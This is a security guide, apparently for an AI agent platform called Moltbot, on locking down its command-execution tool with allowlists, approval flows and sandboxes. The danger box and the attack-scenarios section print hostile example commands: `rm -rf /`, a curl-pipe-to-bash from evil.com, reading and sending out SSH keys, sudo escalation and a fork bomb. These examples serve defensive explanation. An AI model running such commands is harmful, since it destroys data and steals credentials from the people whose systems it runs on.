---
sidebar_position: 2
title: Bảo mật Command (Exec)
description: Hướng dẫn bảo mật tool nguy hiểm nhất của Moltbot - 'exec'. Cách cấu hình Allowlist, Approval Flow và Sandbox để ngăn chặn tấn công.
keywords: [moltbot exec security, command execution safety, ngăn chặn rce, bảo mật ai agent, sandbox configuration]
---

# Exec Security - Command Execution Safety

`exec` tool là **mạnh nhất và nguy hiểm nhất** trong Moltbot. Trang này giải thích cách dùng an toàn.

:::danger[⚠️ CRITICAL]
`exec` có thể:
- **Delete files**: `rm -rf /`
- **Install malware**: `curl evil.com/script.sh | bash`
- **Steal credentials**: `cat ~/.ssh/id_rsa`
- **Crypto mining**: Background processes
- **Data exfiltration**: Upload files ra external servers

**KHÔNG BAO GIỜ** dùng `security: "full"` với agents không tin tưởng hoặc trong production!
:::

---

## Security Model Overview

### 3 Layers of Protection

```
┌─────────────────────────────────┐
│   1. Security Policy            │
│   (deny | allowlist | full)     │
└─────────────────────────────────┘
           ↓
┌─────────────────────────────────┐
│   2. Approval Flow              │
│   (off | on-miss | always)      │
└─────────────────────────────────┘
           ↓
┌─────────────────────────────────┐
│   3. Sandbox Isolation          │
│   (optional workspace)           │
└─────────────────────────────────┘
```

---

## Layer 1: Security Policy

### `deny` (Safest)

**Block tất cả exec calls**

```json
{
  "tools": {
    "exec": {
      "security": "deny"
    }
  }
}
```

**Use case:**
- Agents chỉ cần read-only access
- Production bots không cần command execution
- Public-facing bots

**Result:** All exec → Error immediately

---

### `allowlist` (Recommended)

**Chỉ cho phép commands trong whitelist**

```json
{
  "tools": {
    "exec": {
      "security": "allowlist",
      "allowlist": [
        "npm install",
        "npm test",
        "git status",
        "git pull",
        "ls -la",
        "cat logs/*.log"
      ]
    }
  }
}
```

**Matching:**
- Exact match: `"git status"` → Only `git status`
- Prefix match: `"npm *"` → `npm install`, `npm test`, etc.
- Regex: `"/^git (status|pull)$/"` → `git status` or `git pull`

**Per-agent allowlist:**
```json
{
  "agents": {
    "list": [
      {
        "id": "deploy-bot",
        "tools": {
          "exec": {
            "allowlist": [
              "npm run build",
              "pm2 restart app"
            ]
          }
        }
      },
      {
        "id": "backup-bot",
        "tools": {
          "exec": {
            "allowlist": [
              "tar -czf /backup/*.tar.gz /data"
            ]
          }
        }
      }
    ]
  }
}
```

---

### `full` (⚠️ Dangerous)

**Cho phép TẤT CẢ commands**

```json
{
  "tools": {
    "exec": {
      "security": "full"
    }
  }
}
```

:::warning[ONLY USE IF]
- Development environment riêng
- Isolated VM/container
- Trusted personal use only
- **NEVER** trong production
- **NEVER** với public bots
:::

---

## Layer 2: Approval Flow

### `ask: "off"` (Auto-run)

**Never ask** - chạy luôn nếu trong allowlist

```json
{
  "tools": {
    "exec": {
      "ask": "off",
      "security": "allowlist"
    }
  }
}
```

**Safe khi:**
- Allowlist rất cụ thể
- Commands không destructive
- Trusted environment

---

### `ask: "on-miss"` (Recommended)

**Ask nếu không có trong allowlist**

```json
{
  "tools": {
    "exec": {
      "ask": "on-miss",
      "security": "allowlist",
      "allowlist": ["git status", "ls"]
    }
  }
}
```

**Flow:**
1. Agent muốn chạy `git status` → ✅ Auto-run (trong allowlist)
2. Agent muốn chạy `rm file.txt` → ⚠️ Ask user approval

**Best practice:** Gradually build allowlist
- Start với `ask: "always"`
- Approve safe commands nhiều lần
- Add vào allowlist
- Switch to `ask: "on-miss"`

---

### `ask: "always"` (Safest)

**Always ask** trước mỗi exec

```json
{
  "tools": {
    "exec": {
      "ask": "always"
    }
  }
}
```

**Use case:**
- Learning phase
- Untrusted agents
- High-security environments

**Tradeoff:** Lots of interruptions

---

## Layer 3: Sandbox Isolation

### Workspace Restriction

**Giới hạn file access** trong workspace

```json
{
  "agents": {
    "defaults": {
      "workspace": "/home/user/moltbot-sandbox",
      "sandbox": {
        "enabled": true,
        "enforceWorkspace": true
      }
    }
  }
}
```

**Behavior:**
- `read_file`, `write_file`: Only trong workspace
- `exec`: CWD = workspace
- `..` paths blocked

**Example:**
```bash
# Agent in /home/user/moltbot-sandbox
exec("cat /etc/passwd")  # ❌ Blocked
exec("cat ./data.txt")   # ✅ OK (within workspace)
```

---

### Container Isolation (Advanced)

**Docker container** cho agents:

```yaml
# docker-compose.yml
services:
  moltbot-agent:
    image: moltbot:latest
    volumes:
      - ./sandbox:/workspace:rw
      - /etc/passwd:/etc/passwd:ro  # Read-only system files
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    networks:
      - isolated
```

**Benefits:**
- Full process isolation
- Resource limits (CPU/RAM)
- Network isolation
- File system restrictions

---

## Approval UI

### Chat Channel Approvals

**Forward approval requests** tới chat:

```json
{
  "tools": {
    "exec": {
      "approvals": {
        "forwardTo": "telegram",
        "timeout": 300  // 5 minutes
      }
    }
  }
}
```

**Flow:**
1. Agent request exec
2. Bot sends message tới Telegram:
   ```
   🔔 Exec Approval Request
   Command: rm temp/*.log
   Agent: cleanup-bot
   Risk: Medium

   Reply:
   /approve abc123
   /deny abc123
   ```
3. User reply `/approve abc123`
4. Command executes

---

### Dashboard Approvals

**GUI workflow:**

1. Open `http://localhost:18789/approvals`
2. See pending requests:
   ```
   Command: npm install axios
   Agent: dev-helper
   Time: 2026-01-30 10:40:15
   
   [Approve] [Deny] [Add to Allowlist]
   ```
3. Click action

---

## Best Practices

### 1. Start Restrictive, Gradually Open

**Week 1:**
```json
{
  "tools": {
    "exec": {
      "security": "allowlist",
      "ask": "always",
      "allowlist": []
    }
  }
}
```

**Week 2-4:** Add frequently-used safe commands
```json
{
  "allowlist": [
    "git status",
    "npm test",
    "ls -la"
  ],
  "ask": "on-miss"
}
```

**Month 2:** Switch to on-miss
```json
{
  "ask": "on-miss"
}
```

---

### 2. Separate Agents by Permission

```json
{
  "agents": {
    "list": [
      {
        "id": "readonly",
        "tools": {
          "exec": {
            "security": "deny"
          }
        }
      },
      {
        "id": "developer",
        "tools": {
          "exec": {
            "security": "allowlist",
            "allowlist": ["npm *", "git *"]
          }
        }
      },
      {
        "id": "admin",
        "tools": {
          "exec": {
            "security": "full",
            "ask": "always"
          }
        },
        "sandbox": {
          "enabled": false
        }
      }
    ]
  }
}
```

**Route users accordingly:**
```json
{
  "agents": {
    "bindings": {
      "whatsapp:+84123456789": "readonly",
      "telegram:@devuser": "developer",
      "telegram:@admin": "admin"
    }
  }
}
```

---

### 3. Audit Regularly

```bash
# View exec history
moltbot logs --filter exec --limit 100

# Security audit
moltbot security audit --deep

# Export for review
moltbot logs --filter exec --format json > exec_audit.json
```

**Look for:**
- Unusual commands
- Failed approvals
- Denied attempts
- Suspicious patterns

---

### 4. Allowlist Patterns

**Good patterns:**
```json
{
  "allowlist": [
    "npm install",           // Exact match
    "git status",
    "ls -la /workspace/*",   // Scoped path
    "/^pm2 (list|status)$/"  // Regex specific
  ]
}
```

**Bad patterns:**
```json
{
  "allowlist": [
    "rm *",          // ❌ Too broad
    "curl *",        // ❌ Can download malware
    "sudo *",        // ❌ Privilege escalation
    "/^.*$/"         // ❌ Matches everything
  ]
}
```

---

### 5. Defense in Depth

**Multiple layers:**
```json
{
  "agents": {
    "defaults": {
      "sandbox": {
        "enabled": true,
        "workspace": "/sandbox"
      },
      "tools": {
        "exec": {
          "security": "allowlist",
          "ask": "on-miss",
          "timeout": 300,  // Auto-kill after 5 min
          "allowlist": ["git status", "npm test"]
        }
      }
    }
  }
}
```

**Plus:**
- Run in Docker
- Network firewall
- File system quotas
- Process limits

---

## Common Attack Scenarios

### 1. Command Injection

**Attack:**
```bash
Agent: "List files in /tmp"
User: "Show me /tmp files"
Agent exec: ls -la /tmp; rm -rf /
```

**Defense:**
- Allowlist blocks `rm`
- Approval required
- Sandbox prevents access to `/`

---

### 2. Credential Theft

**Attack:**
```bash
exec("cat ~/.ssh/id_rsa > /tmp/key.txt")
exec("curl evil.com?data=$(cat /tmp/key.txt)")
```

**Defense:**
- Sandbox blocks access to `~/.ssh`
- `curl` not in allowlist
- Approval flow catches suspicious commands

---

### 3. Privilege Escalation

**Attack:**
```bash
exec("sudo su -")
exec("chmod +s /bin/bash")
```

**Defense:**
- `sudo` blocked by allowlist
- Sandbox has no sudo access
- Container has `no-new-privileges`

---

### 4. Resource Exhaustion

**Attack:**
```bash
exec(":(){ :|:& };:")  // Fork bomb
exec("dd if=/dev/zero of=/tmp/fill")  // Disk fill
```

**Defense:**
- Timeout kills long processes
- Container resource limits
- Disk quotas

---

## Incident Response

### If Compromised

1. **Immediately kill gateway:**
   ```bash
   pkill -9 moltbot
   ```

2. **Check for damage:**
   ```bash
   # Check modified files
   find / -type f -mtime -1
   
   # Check network connections
   netstat -tuln
   
   # Check processes
   ps aux | grep -v "\[" 
   ```

3. **Rotate credentials:**
   - API keys
   - Bot tokens
   - SSH keys
   - Passwords

4. **Review logs:**
   ```bash
   cat ~/.clawdbot/logs/*.log | grep exec
   ```

5. **Report:**
   - Moltbot security team
   - Hosting provider (if VPS)

---

## Tools Comparison

| Security Level | Config | Best For |
|----------------|--------|----------|
| **Paranoid** | `deny` + sandbox | Public bots |
| **Safe** | `allowlist` + `ask: on-miss` | Personal usage |
| **Convenient** | `allowlist` + `ask: off` | Trusted automation |
| **Full Access** | `full` + `ask: always` | Dev only |
| **⚠️ Dangerous** | `full` + `ask: off` | **NEVER USE** |

---

## Next Steps

- [Tools Overview](/docs/advanced/tools-overview)
- [Sandbox Configuration](/docs/gateway/sandboxing)
- [Multi-Agent Security](/docs/concepts/multi-agent)

---

_Questions? [Discord #security](https://discord.gg/moltbot-vn) | Report issues: security@moltbot.vn_
